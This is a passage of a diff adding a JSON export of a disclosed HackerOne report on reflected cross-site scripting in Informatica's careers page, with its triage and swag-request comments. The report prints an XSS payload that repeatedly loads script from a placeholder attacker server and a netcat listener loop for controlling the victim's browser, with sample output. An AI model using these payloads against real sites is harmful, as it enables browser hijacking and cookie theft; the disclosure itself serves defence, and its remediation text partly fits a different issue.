+            "additional_data": {
+                "duplicate_report_id": 181579
+            }, 
+            "team_handle": "informatica", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 1298554, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "zephrfish", 
+                "url": "/zephrfish"
+            }, 
+            "created_at": "2016-11-30T20:59:34.619Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-11-30T20:59:34.619Z", 
+            "actor": {
+                "username": "ttoko", 
+                "url": "/ttoko", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/347/32202de788e03d55e0c958f820fe2917eb305a8b_medium.jpg?1443193918"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hello @zephrfish,\n\nOur team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!\n\nRegards,\nThe Informatica Team", 
+            "markdown_message": "<p>Hello <a href=\"/zephrfish\">@zephrfish</a>,</p>\n\n<p>Our team has remediated this vulnerability. Please check your original Proof of Concept, and let us know if you think the bug is still exploitable. If you find a way to bypass our fix, please open a new and give us further details. Thanks for your efforts in keeping Informatica safe, and well done!</p>\n\n<p>Regards,<br>\nThe Informatica Team</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1331332, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-01T00:19:24.283Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-01T00:19:24.283Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @ttoko my original payload does not work can confirm. just wondering, Is this issue eligible for a bounty/swag?", 
+            "markdown_message": "<p>Hi <a href=\"/ttoko\">@ttoko</a> my original payload does not work can confirm. just wondering, Is this issue eligible for a bounty/swag?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1332403, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-01T00:20:50.210Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-01T00:20:50.210Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "first_to_agree": true, 
+            "message": "Can we disclose this please?", 
+            "markdown_message": "<p>Can we disclose this please?</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1332404, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-09T11:41:09.563Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-09T11:41:09.563Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @ttoko @informatica is this eligible for swag? Thanks", 
+            "markdown_message": "<p>Hi <a href=\"/ttoko\">@ttoko</a> <a href=\"/informatica\">@informatica</a> is this eligible for swag? Thanks</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1353555, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-31T00:20:57.604Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-31T00:20:57.604Z", 
+            "actor": {
+                "url": "/informatica", 
+                "profile": {
+                    "name": "Informatica"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/453/a8f0e5d0c649beeca777fb020fc0a036daa45f27_medium.jpg?1493894101"
+                }
+            }, 
+            "team_handle": "informatica", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1392783, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-05T23:03:50.541Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-05T23:03:50.541Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @ttoko @informatica is this eligible for swag? Thanks", 
+            "markdown_message": "<p>Hi <a href=\"/ttoko\">@ttoko</a> <a href=\"/informatica\">@informatica</a> is this eligible for swag? Thanks</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1520744, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "zephrfish", 
+                "url": "/zephrfish"
+            }, 
+            "created_at": "2017-03-09T03:00:59.561Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-09T03:00:59.561Z", 
+            "actor": {
+                "url": "/informatica", 
+                "profile": {
+                    "name": "Informatica"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/453/a8f0e5d0c649beeca777fb020fc0a036daa45f27_medium.jpg?1493894101"
+                }
+            }, 
+            "team_handle": "informatica", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::SwagAwarded", 
+            "id": 1529022, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-08T12:37:51.456Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-08T12:37:51.456Z", 
+            "actor": {
+                "username": "zephrfish", 
+                "url": "/zephrfish", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/037/729/717362810528040581fdd251f1d553af1f0e448c_medium.jpeg?1517786639"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "informatica", 
+            "message": "Hi @informatica @hacker0x1 this swag actually never arrived! ", 
+            "markdown_message": "<p>Hi <a href=\"/informatica\">@informatica</a> @hacker0x1 this swag actually never arrived! </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2362376, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "zephrfish", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/zephrfish", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/037/729/d3b1ced5036e19728d40ded06c91738d534a696a_small.jpeg?1517786639"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 58, 
+        "name": "Command Injection - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -60992495.61782228, 
+    "disclosed_at": "2016-12-31T00:20:57.583Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/147196", 
+    "created_at": "2016-06-25T14:28:47.229Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h5 id=\"description\">Description</h5>\n\n<p>Cross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.</p>\n\n<h5 id=\"issue\">Issue</h5>\n\n<p>The consultant identified that the careers page is vulnerable to reflected cross site scripting, this means that a malicious user can craft a link to compromise a user, the user simple needs to click on the link and the payload is launched. </p>\n\n<hr>\n\n<h5 id=\"affected-urls\">Affected URLs</h5>\n<pre class=\"highlight plaintext\"><code>https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E\n</code></pre>\n<p>From the affected URL it can be seen that the <code>isJTN</code> parameter can be given any javascript code or HTML tags and it will execute the code within. The above payload simply launches a prompt box with the consultant&#39;s hackerone username ZephrFish. However cross site scripting can be further weaponised to hook a victim&#39;s browser and cause further damage. See the proof of concept section below for a full weaponised scenario using this reflected cross site scripting to execute client side code execution.</p>\n\n<h4 id=\"risk-high\">Risk: <strong>High</strong>\n</h4>\n\n<p>This issue has been marked as high due to  the risk of compromise being on the user rather than server side, however this should still be considered as an issue and dealt with accordingly, if an attacker is able to compromise a victim&#39;s browser they can do far worse than pop an alert message. This is essentially a new form of reflected cross site scripting which is persistent to the user&#39;s browser being open.</p>\n\n<h5 id=\"remediaton\">Remediaton</h5>\n\n<p>Implement http authentication on the affected directories, or alternatively  remove the examples folder entirely to prevent the attack surface.  Consider following a lockdown procedure against the installation and updating Tomcat to a newer instance. </p>\n\n<h5 id=\"weaponising-cross-site-scripting\">Weaponising Cross Site Scripting</h5>\n\n<p>The following example demonstrates how an attacker can establish a persistent connection to a victim&#39;s browser and proceed to execute arbitrary commands on the victim&#39;s machine.</p>\n\n<p><strong>The hook</strong><br>\nThe victim receives a malicious link, similar to that shown below:</p>\n<pre class=\"highlight plaintext\"><code>https://careers.informatica.com/apply?isJTN=&lt;script&gt;setInterval(function(){d=document;z=d.createElement(&quot;script&quot;);z.src=&quot;//AttackerServerIP:ANYPORT&quot;;d.body.appendChild(z)},0)&lt;/script&gt;\n</code></pre>\n<p>Attacker Server:<br>\nThe attacker runs the following code to catch the shell with netcat:</p>\n<pre class=\"highlight plaintext\"><code>while :; do printf &quot;ZephrFishHackerOne&gt;$ &quot;; read c; echo $c | nc -vvlp PORTNUMBER &gt;/dev/null; done\n</code></pre>\n<p>When this link is clicked on the attacker&#39;s server will catch a shell and allow the attacker to execute arbitrary commands on the victim&#39;s browser as shown in the attached screenshots, these commands can be any javascript commands including theft of cookies, redirection of victim&#39;s browser or in some cases malware delivery.</p>\n\n<p>The following shows what is shown on the attacker&#39;s server when a valid connection attempt is received:</p>\n<pre class=\"highlight plaintext\"><code>[root@inform]# while :; do printf &quot;ZephrFishHackerOne&gt;$ &quot;; read c; echo $c | nc -vvlp 533 &gt;/dev/null; done\nZephrFishHackerOne&gt;$ alert(&#39;Shell&#39;)\nlistening on [any] 533 ...\nconnect to [ATTACKERIP] from VICTIM HOSTNAME [VICTIM BROWSERIP] 55730\n sent 15, rcvd 245\n</code></pre>\n<h5 id=\"references\">References</h5>\n\n<ul>\n<li><a href=\"/redirect?signature=93776183e78f3ba312593dfade6c30c2706e3da7&amp;url=https%3A%2F%2Fwww.owasp.org%2Findex.php%2FXSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>OWASP: Cross Site Scripting Prevention</span><i class=\"icon-external-link\"></i></a></li>\n</ul>\n\n<h5 id=\"request\">Request &amp; Response</h5>\n\n<p>GET Request</p>\n<pre class=\"highlight plaintext\"><code>GET /apply?isJTN=%3Cscript%3Eprompt(&#39;ZephrFish&#39;)%3C/script%3E HTTP/1.1\nHost: careers.informatica.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nCookie: AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16977%7CMCMID%7C43066833403543674402896414893465241440%7CMCAID%7CNONE%7CMCAAMLH-1467332027%7C6%7CMCAAMB-1467332028%7CNRX38WO0n5BH8Th-nqAG_A; mbox=PC#1466727226198-680058.26_3#1468009316|check#true#1466799776|session#1466799715648-663873#1466801576; s_nr=1466799716120-Repeat; s_vnum=1469319227675%26vn%3D3; mktrest_end_time=1466727232954; mktrest_cookie=anonymous; wooTracker=pFDG1ZqP3HWn; _mkto_trk=id:189-ZHZ-794&amp;token:_mch-informatica.com-1466727758906-39922; mrkto_lead=&quot;{\\&quot;requestId\\&quot;:\\&quot;11ba9#1557fcb4463\\&quot;,\\&quot;result\\&quot;:[],\\&quot;success\\&quot;:true,\\&quot;marketoCall\\&quot;:\\&quot;false\\&quot;}&quot;; do_mkto_call=false; _ga=GA1.2.935149421.1466727762\nConnection: close\n</code></pre>\n<p>Response</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nContent-Language: en-US\nContent-Type: text/html;charset=utf-8\nDate: Sat, 25 Jun 2016 14:14:16 GMT\nServer: Apache-Coyote/1.1\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nVary: Accept-Encoding\nConnection: Close\nContent-Length: 53097\n---snip---\n            var payload = {fileUrl: link, jobSeqNo: jobId, refNum: refNum, isQuickApply: isQuickApply,\n                            actualJobId: actualJobId, title: title, location: location,\n                            applySource: applySource, applyUrl: applyUrl, category: category, isJTN: &quot;&lt;script&gt;prompt(&#39;ZephrFish&#39;)&lt;/script&gt;&quot;,\n                            atsApplyDataId:atsApplyDataId,atsApplyStatusId:atsApplyStatusId, applyType: applyType,\n                            screenWidth: screen.width, screenHeight: screen.height}\n           sendDownloadResume(payload) \n---snip---\n</code></pre>", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.informatica.com/", 
+            "about": "Informatica Corporation is the world\u2019s number one independent provider of data integration software.", 
+            "twitter_handle": "", 
+            "name": "Informatica"
+        }, 
+        "handle": "informatica", 
+        "url": "https://hackerone.com/informatica", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/453/ae79628e2753525acce99182b7d0a7b91f3cf0da_small.jpg?1493894101", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/453/a8f0e5d0c649beeca777fb020fc0a036daa45f27_medium.jpg?1493894101"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 453, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
